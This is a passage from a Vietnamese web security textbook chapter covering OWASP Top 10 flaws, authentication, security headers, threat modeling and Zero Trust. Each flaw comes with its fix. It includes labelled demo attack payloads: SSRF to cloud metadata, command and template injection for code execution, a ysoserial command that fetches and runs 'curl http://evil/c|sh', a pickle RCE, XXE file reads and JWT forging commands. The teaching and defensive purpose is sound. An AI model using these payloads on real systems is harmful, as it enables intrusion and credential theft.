Server kiểm tra `csrf_token` khớp giá trị gắn với `session`. Token nên: dùng một lần hoặc per-session, so khớp bằng so sánh hằng thời gian (chống timing).

### 5.5.3. Phòng thủ 2: SameSite Cookie

**Cơ chế.** Thuộc tính `SameSite` chỉ thị trình duyệt có gửi cookie kèm request cross-site hay không.

| Giá trị | Hành vi | Ghi chú |
|---------|---------|---------|
| `Strict` | KHÔNG gửi cookie với mọi request khởi từ site khác | Mạnh nhất; phá vỡ điều hướng từ link ngoài |
| `Lax` | Gửi với navigation top-level GET (bấm link), KHÔNG gửi với POST cross-site / subresource | Mặc định của trình duyệt hiện đại |
| `None` | Luôn gửi (phải kèm `Secure`) | Cần cho cookie thật sự cross-site |

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

`SameSite=Lax` mặc định đã chặn CSRF dạng POST tự submit. Tuy nhiên không nên chỉ dựa vào SameSite (một số request GET gây tác động, hoặc client cũ); kết hợp anti-CSRF token cho hành động nhạy cảm.

---

## 5.6. A10 — Server-Side Request Forgery (SSRF)

**Là gì:** SSRF là việc ép **server** gửi request HTTP/TCP tới đích do attacker chọn. Vì server thường nằm trong mạng nội bộ tin cậy, attacker dùng nó làm proxy để chạm tới dịch vụ nội bộ, metadata cloud, hoặc quét cổng nội mạng.

### 5.6.1. Mục tiêu kinh điển: Cloud metadata

Trên AWS EC2 (IMDSv1), endpoint metadata trả về credential tạm thời (xem thêm [Chương 13 — Bảo mật Đám mây](#sec-13) về metadata/IMDS):

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```
`169.254.169.254` là địa chỉ link-local (RFC 3927, dải `169.254.0.0/16`) chỉ truy cập được từ trong instance. Code dễ tổn thương:

```python
# ❌ Fetch URL do người dùng cung cấp
url = request.args['image_url']
resp = requests.get(url)        # attacker đưa url=http://169.254.169.254/...
```

Payload `[DEMO]` (chỉ minh hoạ cơ chế):
```http
POST /fetch-image HTTP/1.1
Content-Type: application/json

{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"}
```
Response chứa `AccessKeyId`, `SecretAccessKey`, `Token` → attacker chiếm quyền role.

**Vì sao IMDSv2 ra đời:** IMDSv2 yêu cầu lấy token qua `PUT` (kèm header `X-aws-ec2-metadata-token-ttl-seconds`) trước, rồi mới `GET` kèm token. Vì SSRF cơ bản thường chỉ gửi GET, IMDSv2 chặn được nhiều biến thể. Khuyến nghị: bắt buộc IMDSv2 (`HttpTokens: required`).

### 5.6.2. Phòng thủ: Allowlist + chặn IP nội bộ

```python
import ipaddress, socket
from urllib.parse import urlparse

BLOCK_NETS = [ipaddress.ip_network(n) for n in
    ['127.0.0.0/8','10.0.0.0/8','172.16.0.0/12','192.168.0.0/16',
     '169.254.0.0/16','::1/128','fc00::/7']]

def safe_fetch(url):
    u = urlparse(url)
    if u.scheme not in ('http','https'):
        raise ValueError('scheme không cho phép')
    # Resolve để chống DNS rebinding: kiểm tra IP thực
    ip = ipaddress.ip_address(socket.gethostbyname(u.hostname))
    if any(ip in net for net in BLOCK_NETS):
        raise ValueError('IP nội bộ bị chặn')
    return requests.get(url, allow_redirects=False, timeout=5)  # chặn redirect tới IP nội bộ
```

| Kỹ thuật né | Cách chặn |
|-------------|-----------|
| `http://0177.0.0.1` (octal), `http://2130706433` (decimal) → 127.0.0.1 | Resolve về IP rồi mới so khớp dải, không so chuỗi |
| DNS rebinding (TTL ngắn, domain → IP nội bộ) | Resolve một lần, pin IP đó cho cả kết nối |
| Redirect 302 → IP nội bộ | `allow_redirects=False` rồi tự kiểm |
| `gopher://`, `file://` | Allowlist scheme |

**Lưu ý bảo mật:** Phòng thủ mạnh nhất là **allowlist đích cụ thể** (chỉ cho phép vài host đã biết) thay vì blocklist; kết hợp egress firewall chặn server gọi ra `169.254.169.254` và mạng nội bộ.

---

## 5.7. A01 — Broken Access Control & IDOR

**Là gì:** Broken Access Control: ứng dụng không thực thi đúng việc người dùng chỉ được làm điều được phép. **IDOR (Insecure Direct Object Reference)** là biến thể: tham chiếu trực tiếp tới đối tượng (ID) mà không kiểm tra quyền sở hữu.

### 5.7.1. Cơ chế IDOR

```http
GET /api/invoices/1001 HTTP/1.1
Authorization: Bearer <token của user A>
```
Server trả hóa đơn 1001. Attacker đổi sang `1002`:
```http
GET /api/invoices/1002 HTTP/1.1
Authorization: Bearer <token của user A>
```
Nếu server trả luôn 1002 (của user B) mà không kiểm `invoice.owner == current_user` → IDOR.

```python
# ❌ Chỉ kiểm đăng nhập, không kiểm sở hữu
@app.get('/api/invoices/<int:iid>')
@login_required
def get_invoice(iid):
    return Invoice.query.get(iid)            # bất kỳ ai cũng lấy bất kỳ id
```
```python
# ✅ Kiểm quyền sở hữu trên CHÍNH query
@app.get('/api/invoices/<int:iid>')
@login_required
def get_invoice(iid):
    inv = Invoice.query.filter_by(id=iid, owner_id=current_user.id).first_or_404()
    return inv
```

### 5.7.2. Các biến thể Broken Access Control

| Biến thể | Mô tả | Phòng thủ |
|----------|-------|-----------|
| Vertical privilege escalation | User thường gọi endpoint admin (`/admin/users`) | Kiểm vai trò ở server, không dựa UI ẩn nút |
| Horizontal (IDOR) | Truy cập tài nguyên user khác cùng cấp | Kiểm sở hữu trên mỗi tài nguyên |
| Force browsing | Đoán URL không link tới (`/internal/report`) | Mặc định deny, kiểm quyền mọi route |
| Mass assignment | POST thêm field `role=admin` được binding | Allowlist field cho phép sửa |
| Method override | Dùng `PUT/DELETE` khi chỉ test `GET` | Kiểm quyền theo cả method |

**Nguyên tắc thiết kế:** *deny by default*, kiểm quyền tập trung (middleware) phía **server** trên từng request. Không dùng ID tuần tự đoán được làm cơ chế bảo mật (UUID giúp giảm dò quét nhưng KHÔNG thay thế kiểm quyền).

---

## 5.8. A03 — Command Injection

**Là gì:** Khi ứng dụng truyền dữ liệu người dùng vào lệnh hệ điều hành qua shell, attacker chèn metacharacter shell (`;`, `|`, `&&`, `` ` ``, `$()`) để thực thi lệnh tùy ý.

```python
# ❌ shell=True + nối chuỗi
host = request.args['host']
os.system("ping -c 1 " + host)     # host = "8.8.8.8; cat /etc/passwd"
```
Shell thấy: `ping -c 1 8.8.8.8; cat /etc/passwd` → chạy cả hai lệnh.

| Metachar | Tác dụng | Payload |
|----------|----------|---------|
| `;` | Tách lệnh tuần tự | `8.8.8.8; id` |
| `\|` | Pipe / chạy lệnh sau | `8.8.8.8 \| id` |
| `&&` / `\|\|` | AND / OR | `8.8.8.8 && id` |
| `` `cmd` `` / `$(cmd)` | Command substitution | `$(id)` |
| `\n` | Xuống dòng = lệnh mới | |

**Phòng thủ:** không gọi shell; truyền tham số dạng mảng (execve nhận argv trực tiếp, không qua shell parse):

```python
# ✅ Không qua shell, argv tách bạch
import subprocess, ipaddress
ipaddress.ip_address(host)         # validate là IP hợp lệ trước
subprocess.run(["ping", "-c", "1", host], shell=False, timeout=5)
```
`shell=False` + list argv → `host` luôn là MỘT đối số duy nhất, metachar mất tác dụng. Kết hợp input validation (allowlist ký tự/định dạng).

---

## 5.9. A03 — Server-Side Template Injection (SSTI)

**Là gì:** Khi input người dùng được nhúng vào template engine phía server và được engine *biên dịch* như mã template, attacker thực thi biểu thức của engine → thường dẫn tới RCE.

```python
# ❌ Jinja2: nối input vào template string
from jinja2 import Template
Template("Xin chào " + request.args['name']).render()
```
Payload phát hiện `[DEMO]` (chỉ minh hoạ cơ chế) — Jinja2:
```
name={{7*7}}      → render ra "49"  ⇒ template engine đang đánh giá biểu thức
```
Payload leo thang tới RCE `[DEMO]` (Jinja2/Python):
```
{{ ''.__class__.__mro__[1].__subclasses__() }}      # liệt kê class
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
`__globals__` truy cập namespace module → chạm tới `os`. Mỗi engine có payload riêng:

| Engine | Test | Đặc trưng |
|--------|------|-----------|
| Jinja2 (Python) | `{{7*7}}`→49 | `__class__`, `__globals__` |
| Twig (PHP) | `{{7*7}}`→49 | `_self`, filter `map` |
| Freemarker (Java) | `${7*7}`→49 | `freemarker.template.utility.Execute` |
| ERB (Ruby) | `<%= 7*7 %>`→49 | `system()` |

**Phòng thủ:** không bao giờ ghép input vào template source. Truyền input qua **context variable** (`render(template, name=name)`), dùng sandbox engine nếu phải render template do user cung cấp, và logic-less template (như Mustache) khi có thể.

---

## 5.10. A08 — Insecure Deserialization

**Là gì:** Deserialization biến dữ liệu (byte stream) thành object. Rủi ro nằm ở các cơ chế cho phép khôi phục kiểu tùy ý hoặc gọi method khi dựng lại object. Khi đó, nếu deserialize dữ liệu không tin cậy, attacker có thể dựng một "gadget chain" (chuỗi đối tượng móc nối nhau) dẫn tới RCE.

### 5.10.1. Java — `ObjectInputStream`

Java serialized object bắt đầu bằng magic bytes cố định:

| Offset | Kích thước | Trường | Giá trị |
|--------|-----------|--------|---------|
| 0 | 2 byte | Magic `STREAM_MAGIC` | `0xAC 0xED` |
| 2 | 2 byte | `STREAM_VERSION` | `0x00 0x05` |
| 4 | 1 byte | Type code (TC_OBJECT...) | `0x73` cho object |

Base64 của một stream Java thường bắt đầu bằng `rO0AB...` (chính là `0xACED0005` encode base64) — chỉ dấu nhận diện trong log/Blue Team. Gadget chain (ví dụ qua thư viện Commons Collections) lợi dụng chuỗi `readObject()` gọi nối tiếp tới `Runtime.exec()`.

Công cụ sinh payload — **ysoserial** `[DEMO]` (chỉ minh hoạ cơ chế):
```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://evil/c|sh' > payload.bin
# Gửi payload.bin tới endpoint deserialize không an toàn
base64 payload.bin | head -c 8     # rO0ABXNy...
```

**Phòng thủ:** không deserialize dữ liệu không tin cậy bằng `ObjectInputStream`. Dùng định dạng dữ liệu thuần (JSON/Protobuf) với parser KHÔNG khôi phục kiểu tùy ý. Nếu bắt buộc Java serialization, dùng `ObjectInputFilter` (JEP 290) allowlist class:
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;java.base/*;!*");   // chỉ cho phép package an toàn, cấm còn lại
ois.setObjectInputFilter(filter);
```

### 5.10.2. Python `pickle`

```python
# ❌ pickle.loads dữ liệu không tin cậy = RCE
import pickle
class E:
    def __reduce__(self):
        return (__import__('os').system, ('id',))   # gọi khi unpickle
payload = pickle.dumps(E())     # gửi cho server unpickle
```
`__reduce__` chỉ định cách dựng lại object → trả về callable + args, được gọi lúc unpickle. **Phòng thủ:** không `pickle.loads` dữ liệu ngoài; dùng `json` cho dữ liệu không tin cậy.

---

## 5.11. A05 — XML External Entity (XXE)

**Là gì:** Parser XML cho phép định nghĩa **entity** trỏ tới tài nguyên ngoài; nếu bật, attacker đọc file nội bộ hoặc gây SSRF.

`[DEMO]` Payload XXE dưới đây chỉ minh hoạ cơ chế, KHÔNG dùng thẳng production.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">     <!-- entity ngoài -->
]>
<data>&xxe;</data>                              <!-- &xxe; bung nội dung file -->
```
Khi parser xử lý `&xxe;`, nó đọc `/etc/passwd` và chèn vào kết quả. Biến thể SSRF: `SYSTEM "http://169.254.169.254/..."`. Biến thể "billion laughs" (DoS) lồng entity bùng nổ kích thước.

**Phòng thủ — tắt DTD/external entity:**
```java
// ✅ Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setExpandEntityReferences(false);
```
```python
# ✅ Python: dùng defusedxml thay vì lxml/ElementTree mặc định
from defusedxml.ElementTree import parse
parse('input.xml')   # tự chặn DTD/entity ngoài
```

---

## 5.12. Upload file an toàn

**Rủi ro:** upload web shell (`shell.php`), bỏ qua kiểm tra qua double extension (`x.php.jpg`), null byte, content-type giả, path traversal (`../../`).

| Lớp kiểm tra | Cách làm đúng |
|--------------|----------------|
| Phần mở rộng | Allowlist (`.jpg/.png`), không blocklist |
| Nội dung (magic bytes) | Kiểm chữ ký file: JPEG `FF D8 FF`, PNG `89 50 4E 47 0D 0A 1A 0A` |
| Content-Type | Không tin client; tự xác định server-side |
| Tên file lưu | Sinh tên ngẫu nhiên (UUID), không dùng tên client |
| Nơi lưu | Ngoài web root / object storage; thư mục không execute |
| Kích thước | Giới hạn, chống DoS |

```python
MAGIC = {b'\xff\xd8\xff':'jpg', b'\x89PNG\r\n\x1a\n':'png'}
def check(buf):
    return any(buf.startswith(m) for m in MAGIC)   # đọc vài byte đầu
```
Cấu hình chặn execute (nginx) cho thư mục upload:
```nginx
location /uploads/ {
    location ~ \.(php|phtml|jsp|asp)$ { deny all; }   # không thực thi mã
    default_type application/octet-stream;             # ép tải về, không render
}
```

---

## 5.13. Input Validation vs Output Encoding

Hai khái niệm thường bị nhầm — chúng giải quyết hai vấn đề khác nhau và **bổ sung** cho nhau, không thay thế.

| | Input Validation | Output Encoding |
|--|------------------|-----------------|
| Khi nào | Lúc nhận dữ liệu vào | Lúc đưa dữ liệu ra một interpreter |
| Mục tiêu | Từ chối dữ liệu sai định dạng/ngoài kỳ vọng | Vô hiệu hóa ký tự đặc biệt theo ngữ cảnh đích |
| Cách | Allowlist (regex, kiểu, dải) | Encode/escape theo HTML/JS/SQL/URL |
| Chống được | Giảm bề mặt, không đủ chống injection | Chống injection ở điểm xuất |

Nguyên tắc: **validate input** để đảm bảo đúng kỳ vọng nghiệp vụ, NHƯNG luôn **encode/parameterize ở điểm xuất** vì cùng một dữ liệu hợp lệ vẫn nguy hiểm trong interpreter khác (email hợp lệ `a'b@x.com` vẫn phá SQL nếu nối chuỗi). Không bao giờ coi validation là biện pháp duy nhất chống injection.

---

## 5.14. A07 — Xác thực (Authentication)

### 5.14.1. Session cookie

Mô hình stateful: server lưu session, client giữ session ID trong cookie.

```http
Set-Cookie: SESSIONID=8f3b2c...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

| Thuộc tính | Ý nghĩa | Lưu ý bảo mật |
|------------|---------|----------------|
| `HttpOnly` | JS không đọc được cookie | Giảm trộm cookie qua XSS |
| `Secure` | Chỉ gửi qua HTTPS | Chống nghe lén |
| `SameSite` | Kiểm soát gửi cross-site | Chống CSRF |
| `Path`/`Domain` | Phạm vi gửi | `Domain` nới rộng có thể rò sang subdomain |
| `Max-Age`/`Expires` | Thời hạn | Session ID nên ngắn + idle timeout |

Session ID phải ngẫu nhiên mật mã (≥128 bit entropy). Sau đăng nhập phải **rotate** session ID (chống session fixation). Đăng xuất phải hủy session phía server, không chỉ xóa cookie.

### 5.14.2. JWT — JSON Web Token (RFC 7519)

(Tham chiếu chéo: nền tảng mật mã của chữ ký HS256/RS256 ở [Chương 4](#sec-04).)

**Cấu trúc.** JWT = ba phần Base64URL nối bằng dấu `.`:
```
<Header>.<Payload>.<Signature>
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.dBjftJ...
```

Base64URL khác Base64 chuẩn: `+`→`-`, `/`→`_`, bỏ padding `=` (RFC 4648 §5).

**Header** (JSON decode từ phần 1):
| Trường | Ý nghĩa | Ví dụ |
|--------|---------|-------|
| `alg` | Thuật toán ký | `HS256`, `RS256`, `none` |
| `typ` | Loại token | `JWT` |
| `kid` | Key ID (chọn khóa) | `key-2024` |

**Payload** — các claim chuẩn (registered claims):
| Claim | Kiểu | Ý nghĩa |
|-------|------|---------|
| `iss` | string | Bên phát hành |
| `sub` | string | Chủ thể (user id) |
| `aud` | string/array | Đối tượng nhận |
| `exp` | NumericDate (giây Unix) | Hết hạn |
| `nbf` | NumericDate | Không hợp lệ trước thời điểm này |
| `iat` | NumericDate | Thời điểm phát hành |
| `jti` | string | ID token (chống replay) |

**Signature.**
- HS256: `HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)` — đối xứng, cùng secret để ký và xác minh.
- RS256: `RSASSA-PKCS1-v1_5 + SHA-256` với khóa riêng ký, khóa công khai xác minh — bất đối xứng.

### 5.14.3. Tấn công JWT

`[DEMO]` Các payload/lệnh tấn công dưới đây chỉ minh hoạ cơ chế, KHÔNG dùng thẳng production.

**(a) `alg: none`.** Một số thư viện cũ chấp nhận `alg=none` nghĩa là "không cần chữ ký". Attacker sửa payload, đặt `alg:none`, bỏ phần signature:
```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
                                                              ↑ signature rỗng
```
Nếu server không bắt buộc thuật toán → chấp nhận token giả. **Fix:** allowlist thuật toán phía server (`verify(token, key, algorithms=['RS256'])`), từ chối `none`.

**(b) Confusion HS256 ↔ RS256.** Server cấu hình verify RS256 dùng **public key**. Attacker đổi header sang `HS256` rồi ký bằng chính public key (đã biết, vì là công khai) làm "secret". Nếu thư viện dùng cùng hàm verify mà lấy public key làm khóa HMAC → chữ ký hợp lệ.
```python
# ❌ Lỗ hổng: thuật toán lấy từ token, key dùng chung
jwt.decode(token, public_key)            # không cố định algorithms
# ✅ Cố định thuật toán bất đối xứng
jwt.decode(token, public_key, algorithms=['RS256'])
```

**(c) Thiếu kiểm `exp`/`aud`/chữ ký.** Nhiều lỗi do chỉ base64-decode payload mà không verify. Luôn verify chữ ký TRƯỚC, rồi kiểm `exp`, `nbf`, `aud`, `iss`.

**Công cụ:** `jwt_tool`:
```bash
python3 jwt_tool.py <token> -X a          # thử tấn công alg:none
python3 jwt_tool.py <token> -C -d wordlist.txt   # brute-force secret HS256
```

**Lưu ý:** JWT không thu hồi được dễ dàng (stateless). Dùng `exp` ngắn + refresh token, hoặc danh sách thu hồi (`jti` blacklist). Không để dữ liệu nhạy cảm trong payload (chỉ là base64, ai cũng đọc được).

### 5.14.4. OAuth2 — Authorization Code Flow (RFC 6749), kèm PKCE (RFC 7636)

**Vai trò:**
- Resource Owner (người dùng), Client (ứng dụng), Authorization Server (AS), Resource Server (API).

**Từng bước (Authorization Code + PKCE):**

```
Bước 0 (PKCE): Client sinh code_verifier ngẫu nhiên (43-128 ký tự),
               code_challenge = BASE64URL(SHA256(code_verifier))

Bước 1: Client → trình duyệt → AS  (yêu cầu cấp quyền)
   GET /authorize?
       response_type=code
       &client_id=abc
       &redirect_uri=https://app/cb
       &scope=openid profile
       &state=xyz123                          ← chống CSRF
       &code_challenge=E9Mq...                 ← PKCE
       &code_challenge_method=S256

Bước 2: Người dùng đăng nhập + đồng ý tại AS

Bước 3: AS → redirect về Client kèm authorization code
   302 Location: https://app/cb?code=AUTH_CODE&state=xyz123
   (Client kiểm state khớp giá trị đã gửi)

Bước 4: Client (back-channel, server-to-server) đổi code lấy token
   POST /token
   grant_type=authorization_code
   &code=AUTH_CODE
   &redirect_uri=https://app/cb
   &client_id=abc
   &code_verifier=<verifier gốc>              ← AS kiểm SHA256(verifier)==challenge

Bước 5: AS trả token
   { "access_token":"...", "token_type":"Bearer",
     "expires_in":3600, "refresh_token":"...", "id_token":"..." }

Bước 6: Client gọi API
   GET /api/me   Authorization: Bearer <access_token>
```

**Vì sao Authorization Code thay vì Implicit?** Access token không bao giờ đi qua trình duyệt (URL fragment) trong code flow — giảm rò rỉ. **Vì sao PKCE?** Chống đánh cắp authorization code (nhất là client công khai/mobile không giữ được secret): code chỉ đổi được token nếu kèm `code_verifier` đúng. **`state`** chống CSRF trên redirect.

### 5.14.5. OIDC — OpenID Connect

OIDC là lớp danh tính xây trên OAuth2. Điểm khác: AS trả thêm **`id_token`** (một JWT) chứa claim danh tính. Client phải verify chữ ký `id_token`, kiểm `iss`, `aud` (= client_id), `exp`, và `nonce` (chống replay). `scope=openid` kích hoạt OIDC. Discovery qua `/.well-known/openid-configuration`; khóa công khai tại JWKS endpoint (`jwks_uri`).

### 5.14.6. SAML (so sánh ngắn)

SAML 2.0 dùng XML (SAML Assertion ký XML-DSig) thay vì JWT, phổ biến trong SSO doanh nghiệp. Rủi ro đặc thù: **XML Signature Wrapping (XSW)** — attacker chèn assertion giả mà chữ ký vẫn "khớp" do parser và verifier nhìn vào node khác nhau. Phòng thủ: dùng thư viện SAML cứng cáp, ràng buộc rõ node được ký, kiểm `Audience`, `NotOnOrAfter`.

### 5.14.7. MFA / TOTP (RFC 6238)

**TOTP** sinh mã 6 số đổi mỗi 30 giây:
```
T = floor((unix_time - T0) / X)         # T0=0, X=30s
TOTP = HOTP(K, T)                        # HOTP theo RFC 4226
HOTP = Truncate(HMAC-SHA1(K, T))         # K = secret chia sẻ
```
| Tham số | Giá trị mặc định |
|---------|-------------------|
| Hàm băm | SHA-1 (mặc định RFC 6238) |
| Bước thời gian X | 30 giây |
| Số chữ số | 6 |
| T0 | 0 (epoch) |

Truncation (Dynamic Truncation, RFC 4226): lấy 4 bit cuối của HMAC làm offset, đọc 4 byte từ offset, mask bit cao (clear MSB), modulo `10^6`. Server chấp nhận cửa sổ ±1 bước để bù lệch đồng hồ. Secret `K` chia sẻ qua QR (`otpauth://totp/...?secret=BASE32`). **Lưu ý:** TOTP chống phishing kém (mã vẫn nhập được vào trang giả); WebAuthn/FIDO2 (ràng buộc origin bằng mật mã) mạnh hơn.

---

## 5.15. Authorization — RBAC vs ABAC

| | RBAC (Role-Based) | ABAC (Attribute-Based) |
|--|--------------------|-------------------------|
| Quyết định dựa | Vai trò gán cho user | Thuộc tính (user, resource, env, action) |
| Ví dụ | `role=editor` → sửa bài | `dept==resource.dept AND time<18h` |
| Ưu | Đơn giản, dễ audit | Linh hoạt, theo ngữ cảnh |
| Nhược | Bùng nổ số role | Phức tạp, khó audit |

Triển khai ABAC thường tách **policy** khỏi code (ví dụ OPA/Rego):
```rego
package authz
default allow = false
allow {
  input.action == "read"
  input.user.dept == input.resource.dept
}
```
Nguyên tắc chung: kiểm authorization tập trung, gần dữ liệu, deny-by-default, và *không* dựa vào việc ẩn UI.

---

## 5.16. A05 — Security Headers

| Header | Giá trị mẫu | Tác dụng |
|--------|-------------|----------|
| `Content-Security-Policy` | `default-src 'self'` | Chống XSS/injection tài nguyên |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | Ép HTTPS (HSTS), chống SSL strip |
| `X-Content-Type-Options` | `nosniff` | Cấm trình duyệt đoán MIME (chống MIME confusion) |
| `X-Frame-Options` | `DENY` | Chống clickjacking (cũ; thay bằng `frame-ancestors`) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Hạn chế rò URL qua Referer |
| `Permissions-Policy` | `geolocation=(), camera=()` | Tắt API trình duyệt không dùng |

**HSTS chi tiết:** sau khi nhận `Strict-Transport-Security`, trình duyệt ghi nhớ `max-age` giây và tự chuyển mọi request tới HTTPS, không cho bỏ qua cảnh báo cert. `preload` đưa domain vào danh sách hard-code trong trình duyệt (phải đăng ký tại hstspreload.org) → bảo vệ cả lần truy cập ĐẦU TIÊN.

Cấu hình nginx thực tế:
```nginx
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```
`always` đảm bảo header gắn cả với response lỗi (4xx/5xx).

---

## 5.17. Threat Modeling: STRIDE + DFD + Trust Boundary

**STRIDE** phân loại mối đe dọa theo 6 nhóm, mỗi nhóm phá vỡ một thuộc tính bảo mật:

| STRIDE | Đe dọa | Thuộc tính bị phá | Đối phó tiêu biểu |
|--------|--------|--------------------|---------------------|
| **S**poofing | Giả mạo danh tính | Authentication | MFA, chữ ký số |
| **T**ampering | Sửa dữ liệu | Integrity | HMAC, hash, ký |
| **R**epudiation | Chối bỏ hành vi | Non-repudiation | Audit log ký, timestamp |
| **I**nformation Disclosure | Lộ thông tin | Confidentiality | Mã hóa, phân quyền |
| **D**enial of Service | Từ chối dịch vụ | Availability | Rate limit, autoscale |
| **E**levation of Privilege | Leo thang quyền | Authorization | Least privilege, kiểm quyền |

**DFD (Data Flow Diagram)** mô hình hóa hệ thống bằng 4 phần tử:
```
[External Entity] = hình chữ nhật (user, bên thứ ba)
(Process)         = hình tròn/bo (code xử lý)
|Data Store|      = hai gạch song song (DB, file)
──Data Flow──►    = mũi tên (luồng dữ liệu)
╌╌ Trust Boundary = đường nét đứt (ranh giới tin cậy)
```

**Trust boundary** là nơi mức tin cậy thay đổi — chính là nơi cần kiểm soát (validate/authenticate/authorize). Ví dụ DFD đăng nhập:

```
[Người dùng] ──(creds)──► ╎ ──► (Web App) ──(query)──► |User DB|
                          ╎ ↑ trust boundary: Internet → DMZ
              ◄─(cookie)── ╎ ◄── (Web App)
```
Mọi data flow **cắt qua** trust boundary là ứng viên đe dọa: áp STRIDE cho từng flow đó. Ví dụ flow `creds` qua boundary → Spoofing (cần auth mạnh), Information Disclosure (cần TLS), Tampering (cần integrity).

Quy trình: (1) vẽ DFD, (2) xác định trust boundary, (3) với mỗi phần tử/flow áp STRIDE, (4) xếp hạng rủi ro (ví dụ DREAD hoặc CVSS), (5) chọn biện pháp giảm thiểu, (6) lặp lại theo vòng đời.

---

## 5.18. Zero Trust — NIST SP 800-207

**Là gì:** Zero Trust (ZT) là mô hình bỏ giả định "tin cậy theo vị trí mạng" — nằm trong LAN không có nghĩa là an toàn. Khẩu hiệu: *"never trust, always verify"*. NIST SP 800-207 định nghĩa kiến trúc và nguyên tắc (cần đối chiếu văn bản chính thức của NIST khi triển khai).

**Bảy nguyên tắc cốt lõi (NIST SP 800-207, tóm lược — cần đối chiếu văn bản gốc):**
1. Mọi nguồn dữ liệu và dịch vụ tính toán đều là resource.
2. Bảo mật mọi giao tiếp bất kể vị trí mạng.
3. Cấp quyền truy cập **theo từng phiên** (per-session).
4. Quyết định truy cập dựa **policy động** theo thuộc tính (danh tính, trạng thái thiết bị, ngữ cảnh).
5. Giám sát và đo lường tính toàn vẹn/tư thế bảo mật của tài sản.
6. Xác thực và phân quyền **động, chặt chẽ** trước mỗi truy cập.
7. Thu thập tối đa thông tin về trạng thái để cải thiện tư thế bảo mật.

**Kiến trúc logic (PEP/PDP):**
```
                  ┌────────── Control Plane ──────────┐
                  │   PDP = Policy Decision Point      │
   ┌──────┐       │   ┌────────────┐  ┌────────────┐  │      ┌──────────┐
   │Subject│──req─┤   │Policy Engine│  │Policy Admin │  │      │ Resource │
   │+Device│      │   └─────┬──────┘  └──────┬──────┘  │      │  (đích)  │
   └──────┘       └─────────┼────────────────┼─────────┘      └────┬─────┘
       │                    │ (decision)      │                    │
       │                    ▼                 ▼                    │
       └────────────► [ PEP ] Policy Enforcement Point ───────────┘
                       (cho phép/chặn từng phiên)
```
- **PDP** (Policy Decision Point): gồm *Policy Engine* (ra quyết định cho/chặn) + *Policy Administrator* (thiết lập/đóng kênh kết nối).
- **PEP** (Policy Enforcement Point): thực thi quyết định — bật/tắt/giám sát kết nối giữa subject và resource.

Quyết định lấy đầu vào từ nhiều nguồn (CDM/quản lý tài sản, threat intel, danh tính, SIEM, chính sách...). Khác mô hình truyền thống: không có "mạng tin cậy", mỗi truy cập tới mỗi resource được xác thực + phân quyền lại theo ngữ cảnh hiện thời. ZT liên hệ trực tiếp tới AppSec: least privilege, micro-segmentation, xác thực mạnh per-request, và giám sát liên tục (gắn với A09 — logging/monitoring).

---

## 5.19. A09 — Logging & Monitoring (ghi chú vận hành)

Thiếu log/giám sát khiến tấn công không bị phát hiện. Cần log: đăng nhập thành công/thất bại, thay đổi quyền, lỗi truy cập, input bị từ chối; kèm `timestamp`, `user`, `source IP`, `action`, `result`. Không log dữ liệu nhạy cảm (mật khẩu, token, PII đầy đủ). Đảm bảo tính toàn vẹn log (append-only, ký/centralize), gắn alert (ví dụ nhiều 401 liên tiếp, spike 500, chữ ký sqlmap/`UNION SELECT`). Liên kết với SIEM để tương quan sự kiện — đây là cầu nối tự nhiên giữa AppSec và Zero Trust (mục 5.18).

---

*Hết Chương 5.*


---

## Ghi chú của mình

> *Khu vực ghi chú cá nhân: những điểm từng hiểu sai, phần còn đang tìm hiểu, hoặc kinh nghiệm rút ra khi thực hành — cập nhật dần.*
